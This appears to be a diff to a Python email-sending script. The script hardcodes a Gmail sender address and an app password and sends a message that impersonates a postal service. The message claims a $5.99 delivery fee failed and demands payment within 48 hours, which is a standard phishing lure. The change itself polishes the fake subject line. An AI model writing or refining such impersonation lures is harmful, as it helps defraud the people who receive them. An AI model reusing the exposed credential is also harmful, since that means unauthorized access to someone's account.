@@ -17,7 +17,7 @@ if send_email:
         # Email configuration
         sender_email = "secadvisor9@gmail.com"
         password = "vmov qeot zehk mpdj"
-        subject = "Important Postal Service - Delivery Update"
+        subject = "Important Postal Service Delivery Update"
         body = """
 Hello,
 You have a package waiting for delivery. However, we were unable to process the delivery fee of $5.99 due to a payment error. Your package will be returned to the sender unless the fee is paid within 48 hours.
